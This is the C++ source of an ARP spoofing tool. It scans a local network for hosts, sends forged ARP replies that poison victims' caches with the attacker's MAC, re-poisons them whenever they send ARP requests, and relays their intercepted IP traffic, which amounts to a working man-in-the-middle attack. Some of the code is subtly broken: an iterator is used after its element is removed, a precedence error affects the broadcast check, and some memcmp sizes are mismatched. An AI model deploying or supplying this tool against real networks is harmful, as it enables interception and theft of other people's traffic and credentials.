#include "arpspoofer.h"

using namespace std;


// Constructors
Address::Address()
{

}

Address::Address(uint32_t ip_in, ether_addr mac_in)
{
    ip = ip_in;
    mac = mac_in;
}


// Operation Overload
bool Address::operator ==(const Address &s)
{
    return ip == s.ip && IsSame(mac, s.mac);
}

bool Address::operator !=(const Address &s)
{
    return ip != s.ip || !IsSame(mac, s.mac);
}



// Constructors
SpoofInfo::SpoofInfo(bool relay_in) : sender(nullptr), target(nullptr), relay(relay_in) {

}

SpoofInfo::SpoofInfo(Address *sender_in, Address *target_in, bool relay_in) : sender(sender_in), target(target_in), relay(relay_in)
{

}


// Operation Overload
bool SpoofInfo::operator ==(const SpoofInfo &s)
{
    return !memcmp(sender, s.sender, sizeof(pair<in_addr, ether_addr>)) && !memcmp(target, s.target, sizeof(pair<in_addr, ether_addr>));
}

bool SpoofInfo::operator !=(const SpoofInfo &s)
{
    return memcmp(sender, s.sender, sizeof(pair<in_addr, ether_addr>)) || memcmp(target, s.target, sizeof(pair<in_addr, ether_addr>));
}


// Constructors
ArpSpoofer::ArpSpoofer() : started(false), on_scan_finished(nullptr) {
    LoadInterfaces();
}

ArpSpoofer::ArpSpoofer(function<void ()> on_scan_finished_in)  : started(false), on_scan_finished(nullptr) {
    on_scan_finished = on_scan_finished_in;
}


// Callbacks
void ArpSpoofer::SetOnScanFinished(function<void ()> function_in) {
    on_scan_finished = function_in;
}


// Propertie
vector<string> ArpSpoofer::GetInterfaces() {
    return packet_manager.GetInterfaces();
}

bool ArpSpoofer::IsStarted()
{
    return started;
}

void ArpSpoofer::SetInterface(string interface_in)
{
    packet_manager.SetInterface(interface_in);
    local_ip = local_address_parser.GetIp(interface_in);
    local_mac = local_address_parser.GetMac(interface_in);
}

void ArpSpoofer::AddSpoofRule(uint32_t sender_ip, uint32_t target_ip, bool relay, bool is_duplex) {
    Address *sender = FindHost(sender_ip);
    Address *target = FindHost(target_ip);

    if (sender == 0x0) throw invalid_argument(error_messages.HostNotFound("sender"));
    if (target == 0x0) throw invalid_argument(error_messages.HostNotFound("target"));

    SpoofInfo spoof_info = SpoofInfo(sender, target, relay);
    rules.push_back(spoof_info);

    SendMaliciousResponse(*sender, ToIp(target->ip));

    if (is_duplex){
        spoof_info = SpoofInfo(target, sender, relay);
        rules.push_back(spoof_info);

        SendMaliciousResponse(*target, ToIp(sender->ip));
    }
}

void ArpSpoofer::RemoveSpoofRule(uint32_t sender_ip, uint32_t target_ip, bool is_duplex)
{
    for (list<SpoofInfo>::iterator rule = rules.begin(); rule != rules.end(); rule++){
        if (rule->sender->ip == sender_ip && rule->target->ip == target_ip){
            rules.remove(*rule);

            if (is_duplex){
                rule++;
                rules.remove(*rule);
            }

            break;
        }
    }
}


// Public Methods
void ArpSpoofer::LoadInterfaces() {
    packet_manager.LoadInterfaces();
}

void ArpSpoofer::Start() {
    if (started) return;

    started =  true;

    listen_thread = thread(&ArpSpoofer::ListenAction, this);
}

void ArpSpoofer::Stop()
{
    if (!started) return;

    listen_thread.detach();

    started = false;
}

void ArpSpoofer::Scan(vector<uint32_t> scan_hosts_in)
{
    scan_hosts = list<uint32_t>();

    for(vector<uint32_t>::iterator host = scan_hosts_in.begin(); host != scan_hosts_in.end(); host++){
        scan_hosts.push_back(*host);
    }

    scan_thread = thread(&ArpSpoofer::ScanAction, this);
}

bool ArpSpoofer::IsInScanList(uint32_t ip_in)
{
    for(list<uint32_t>::iterator ip = scan_hosts.begin(); ip != scan_hosts.end(); ip++){
        if(*ip == ip_in) return true;
    }

    return false;
}

Address *ArpSpoofer::FindHost(uint32_t ip)
{
    for(list<Address>::iterator ip_address = hosts.begin(); ip_address != hosts.end(); ip_address++){
        if(ip_address->ip == ip){
            return &*ip_address;
        }
    }

    return nullptr;
}

SpoofInfo *ArpSpoofer::IsInSpoofList(ether_addr sender_mac_in, in_addr target_ip_in) {
    list<SpoofInfo>::iterator rule;

    for (rule = rules.begin(); rule != rules.end(); rule++) {
        if (IsSame(rule->sender->mac, sender_mac_in) &&  rule->target->ip == target_ip_in.s_addr) {
            return &*rule;
        }
    }

    return nullptr;
}

SpoofInfo *ArpSpoofer::IsInSpoofList(ether_addr sender_mac_in) {
    list<SpoofInfo>::iterator rule;

    for (rule = rules.begin(); rule != rules.end(); rule++) {
        if (IsSame(rule->sender->mac, sender_mac_in)) {
            return &*rule;
        }
    }

    return nullptr;
}

SpoofInfo *ArpSpoofer::IsInSpoofList(Address sender, Address target) {
    list<SpoofInfo>::iterator rule;

    for (rule = rules.begin(); rule != rules.end(); rule++) {
        if (!memcmp(rule->sender, &sender, sizeof(rule->sender)) && !memcmp(rule->target, &target, sizeof(rule->target))) {
            return &*rule;
        }
    }

    return nullptr;
}

void ArpSpoofer::ArpRequest(uint32_t ip)
{
    ethhdr ethernet_header;

    memset(ethernet_header.h_dest, 0xFF, ETHER_ADDR_LEN);
    memcpy(ethernet_header.h_source, &local_mac, ETHER_ADDR_LEN);
    ethernet_header.h_proto = htons(ETHERTYPE_ARP);

    ether_arp arp_header;

    arp_header.ea_hdr.ar_op = htons(ARPOP_REQUEST);
    arp_header.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_header.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_header.ea_hdr.ar_hln = ETHER_ADDR_LEN;
    arp_header.ea_hdr.ar_pln = 4;
    memcpy(arp_header.arp_sha, &local_mac, ETHER_ADDR_LEN);
    memcpy(arp_header.arp_spa, &local_ip.s_addr, 4);
    memset(arp_header.arp_tha, 0x00, ETHER_ADDR_LEN);
    memcpy(arp_header.arp_tpa, &ip, 4);

    ArpPacket arp_packet = ArpPacket(ethernet_header, arp_header);

    packet_manager.SendPacket(arp_packet.ToBinary(), ETHER_HDR_LEN + sizeof(ether_arp));
}

void ArpSpoofer::SendMaliciousResponse(Address sender_in, in_addr target_ip_in)
{
    ethhdr ethernet_header;

    memcpy(ethernet_header.h_source, local_mac.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(ethernet_header.h_dest, sender_in.mac.ether_addr_octet, ETHER_ADDR_LEN);
    ethernet_header.h_proto = htons(ETHERTYPE_ARP);

    ether_arp arp_header;

    arp_header.ea_hdr.ar_op = htons(ARPOP_REPLY);
    arp_header.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_header.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_header.ea_hdr.ar_hln = ETHER_ADDR_LEN;
    arp_header.ea_hdr.ar_pln = 4;
    memcpy(arp_header.arp_sha, local_mac.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(arp_header.arp_spa, &target_ip_in.s_addr, 4);
    memcpy(arp_header.arp_tha, sender_in.mac.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(arp_header.arp_tpa, &sender_in.ip, 4);

    ArpPacket response = ArpPacket(ethernet_header, arp_header);

    packet_manager.SendPacket(response.ToBinary(), ETHER_HDR_LEN + sizeof(ether_arp));
}

void ArpSpoofer::RelayPacket(uint8_t *packet_in, int packet_length, ether_addr dest_mac_in) {
    ethhdr ethernet_header;

    memcpy(ethernet_header.h_source, local_mac.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(ethernet_header.h_dest, &dest_mac_in, ETHER_ADDR_LEN);
    ethernet_header.h_proto = htons(ETHERTYPE_IP);

    memcpy(packet_in, &ethernet_header, ETHER_HDR_LEN);

    packet_manager.SendPacket(packet_in, packet_length);
}


// Thread Actions
void ArpSpoofer::ListenAction() {
    while (started) {
        uint8_t *packet;

        int packet_size;
        packet = packet_manager.GetPacket(packet_size);

        if (packet_size < 1) continue;

        ether_header *ethernet = reinterpret_cast<ether_header*>(packet);

        if (htons(ethernet->ether_type) == ETHERTYPE_ARP){
            ether_arp *arp = reinterpret_cast<ether_arp*>(packet + ETHER_HDR_LEN);

            in_addr sender_ip = ToIp(arp->arp_spa);
            in_addr target_ip = ToIp(arp->arp_tpa);
            ether_addr sender_mac = ToMac(arp->arp_sha);
            ether_addr target_mac = ToMac(arp->arp_tha);

            sender_ip.s_addr = htonl(sender_ip.s_addr);
            target_ip.s_addr = htonl(target_ip.s_addr);

            if(sender_ip.s_addr == local_ip.s_addr) continue;

            if (htons(arp->ea_hdr.ar_op) == ARPOP_REPLY){
                if(IsInScanList(sender_ip.s_addr)){
                    scan_hosts.remove(sender_ip.s_addr);
                }

                Address *sender;
                if ((sender = FindHost(sender_ip.s_addr)) != nullptr){
                    if (IsSame(sender->mac, sender_mac))
                        continue;

                    sender->mac = sender_mac;
                    continue;
                }

                hosts.push_back(Address(sender_ip.s_addr, sender_mac));
            } // Apply change to host list
            else if (htons(arp->ea_hdr.ar_op) == ARPOP_REQUEST){
                if(IsInSpoofList(sender_mac, target_ip))
                    SendMaliciousResponse(Address(sender_ip.s_addr, sender_mac), target_ip);
            } // Send malicious arp response

        }
        else if (htons(ethernet->ether_type) == ETHERTYPE_IP) {
            iphdr *ip = reinterpret_cast<iphdr*>(packet + ETHER_HDR_LEN);

            ether_addr sender_mac = ToMac(ethernet->ether_shost);
            in_addr target_ip = ToIp(ip->daddr);


            SpoofInfo *rule = IsInSpoofList(sender_mac);

            if (rule == 0x0) continue;

            if (rule->relay || target_ip.s_addr & 0x000000FF == 0xFF)
                RelayPacket(packet, packet_size, rule->target->mac);
        }
    }
}

void ArpSpoofer::ScanAction()
{
    list<uint32_t> scan_hosts_clone(scan_hosts);

    scan_failed = list<uint32_t>();

    for(list<uint32_t>::iterator ip = scan_hosts_clone.begin(); ip != scan_hosts_clone.end(); ip++){
        if(*ip == 0x0) return;

        thread scan = thread(&ArpSpoofer::GetMac, this, *ip);
        scan.join();
    }

    while(scan_hosts.size() - scan_failed.size() > 0);

    if(on_scan_finished != nullptr && !(scan_failed.size()))
        on_scan_finished();
}

void ArpSpoofer::GetMac(uint32_t ip)
{
    int max_try = 10;
    int send_time = 0;

    while(max_try != 0){
        if(send_time == 0 || time(0) - send_time >= 1){
            if(!IsInScanList(ip)) {
                return;
            }

            send_time = time(0);
            ArpRequest(ip);
            max_try--;
        }
    }

    scan_failed.push_back(ip);
}
